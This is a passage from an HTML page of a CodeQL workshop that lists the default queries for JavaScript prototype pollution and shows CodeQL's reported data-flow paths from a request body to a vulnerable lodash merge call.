docs/codeql/codeql-workshops/javascript/codeql-js-goof-workshop/workshop.html

<div id="outline-container-orgc3c7b89" class="outline-3">
<h3 id="orgc3c7b89"><span class="section-number-3">6.2</span> Appendix B: Run default queries</h3>
<div class="outline-text-3" id="text-6-2">
<p>
It's always worthwhile to try the default queries. 
The CWE-400 <a href="https://github.com/Semmle/ql/blob/c9e22ab2716b29514435c9691776a73cbb3fe4a5/javascript/ql/test/query-tests/Security/CWE-400/src-vulnerable-lodash/tst.js#L1">tst.js</a> has this vulnerability, but it's not found in the test
code by the queries
</p>

<ul class="org-ul">
<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21">Security/CWE-400/PrototypePollution.ql</a>
Recursively merging a user-controlled object into another object
can allow an attacker to modify the built-in Object prototype.</li>

<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14">Security/CWE-400/PrototypePollutionUtility.ql</a>
Recursively assigning properties on objects may cause accidental
modification of a built-in prototype object.</li>
</ul>

<p>
without some additions as done in <a href="#org1b0a38d">Appendix C: Expand existing query with new sources and sinks</a>.
</p>
</div>
</div>

<div id="outline-container-org1b0a38d" class="outline-3">
<h3 id="org1b0a38d"><span class="section-number-3">6.3</span> Appendix C: Expand existing query with new sources and sinks</h3>
<div class="outline-text-3" id="text-6-3">
<p>
The original query found in <a href="./PrototypePollution-0.ql">./PrototypePollution-0.ql</a> can be enhanced without
changing library code by subclassing as is done in <a href="./PrototypePollution-1.ql">./PrototypePollution-1.ql</a>.
</p>

<p>
This finds a good set of results, including the local query's results found
earlier.
</p>

<p>
The results reported by CodeQL:
</p>
<ul class="org-ul">
<li><p>
Prototype pollution caused by merging a user-controlled value from here using a
vulnerable version of lodash.  index.js:272:22
</p>

<p>
Path
</p>
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">req</td>
<td class="org-left">index.js:259:7</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">req</td>
<td class="org-left">index.js:272:22</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">req.body</td>
<td class="org-left">index.js:272:22</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-left">req.body.message</td>
<td class="org-left">index.js:272:22</td>
</tr>
</tbody>
</table></li>

<li><p>
Prototype pollution caused by merging a user-controlled value from here using a
vulnerable version of just-a-test .  index.js:272:22
</p>

<p>
Path
</p>
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">req</td>
<td class="org-left">index.js:259:7</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">req</td>
<td class="org-left">index.js:272:22</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">req.body</td>
<td class="org-left">index.js:272:22</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-left">req.body.message</td>
<td class="org-left">index.js:272:22</td>
</tr>
</tbody>
</table></li>
</ul>
</div>
</div>

<div id="outline-container-org7d429ea" class="outline-3">
<h3 id="org7d429ea"><span class="section-number-3">6.4</span> Appendix D: Further Reading</h3>
<div class="outline-text-3" id="text-6-4">
<p>
The queries provided by the ql library include the following.  They use 
flow labels and some other advanced concepts that we won't cover during this
workshop.  They are recommended for separate reading.
</p>

<ul class="org-ul">
<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21">Security/CWE-400/PrototypePollution.ql</a></li>
<li><a href="https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14">Security/CWE-400/PrototypePollutionUtility.ql</a></li>
</ul>
</div>
</div>
